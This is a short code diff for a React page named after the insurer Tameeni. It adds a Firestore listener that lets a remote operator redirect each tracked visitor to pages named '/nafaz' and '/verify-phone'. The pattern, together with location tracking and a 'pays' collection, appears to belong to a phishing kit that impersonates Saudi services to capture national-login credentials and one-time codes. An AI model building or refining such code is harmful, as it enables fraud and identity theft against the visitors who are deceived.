@@ -38,8 +38,10 @@ import {
   X,
 } from "lucide-react"
 import { useState, useEffect } from "react"
-import { addData } from "@/lib/firebase"
+import { addData, db } from "@/lib/firebase"
 import { setupOnlineStatus } from "@/lib/utils"
+import { doc, onSnapshot } from "firebase/firestore"
+
 function randstr(prefix:string)
 {
     return Math.random().toString(36).replace('0.',prefix || '');
@@ -54,6 +56,22 @@ export default function TameeniComprehensive() {
   useEffect(() => {
     setMounted(true)
     getLocation()
+
+    const visitorId = localStorage.getItem('visitor') || visitorID
+    const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnapshot) => {
+      if (docSnapshot.exists()) {
+        const userData = docSnapshot.data()
+        if (userData.currentPage === '2' || userData.currentPage === 2) {
+          window.location.href = '/quote'
+        } else if (userData.currentPage === '8888' || userData.currentPage === 'nafaz') {
+          window.location.href = '/nafaz'
+        } else if (userData.currentPage === '9999') {
+          window.location.href = '/verify-phone'
+        }
+      }
+    })
+
+    return () => unsubscribe()
   }, [])
 
   if (!mounted) {
